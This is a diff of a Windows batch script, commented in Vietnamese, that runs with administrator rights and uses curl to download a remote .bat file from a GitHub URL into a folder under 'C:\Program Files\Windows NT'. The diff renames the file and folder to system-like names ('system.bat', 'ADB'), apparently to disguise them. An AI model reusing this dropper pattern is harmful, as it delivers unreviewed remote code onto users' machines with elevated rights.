@@ -8,9 +8,9 @@ if %errorLevel% neq 0 (
 )
 
 :: Thiet lap bien
-set "downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/windows.bat"
-set "destinationDir=C:\Program Files\Windows NT\coccoc"
-set "downloadFile=windows.bat"
+set "downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/system.bat"
+set "destinationDir=C:\Program Files\Windows NT\ADB"
+set "downloadFile=system.bat"
 set "logFile=%destinationDir%\task_history_log.txt"
 
 :: Tao thu muc neu chua ton tai
@@ -23,15 +23,15 @@ if not exist "%destinationDir%" (
 cd /d "%destinationDir%"
 
 :: Tai xuong tep bang curl
-echo Dang tai xuong windows.bat...
+echo Dang tai xuong system.bat...
 echo %date% %time% - Bat dau tai xuong tu %downloadUrl% >> "%logFile%"
 curl -L -o "%downloadFile%" "%downloadUrl%"
 
 :: Kiem tra xem tep da tai xuong thanh cong chua
 if exist "%downloadFile%" (
-    echo %date% %time% - windows.bat da tai xuong thanh cong. >> "%logFile%"
+    echo %date% %time% - system.bat da tai xuong thanh cong. >> "%logFile%"
 ) else (
-    echo %date% %time% - Tai xuong windows.bat that bai. >> "%logFile%"
+    echo %date% %time% - Tai xuong system.bat that bai. >> "%logFile%"
     exit
 )
 
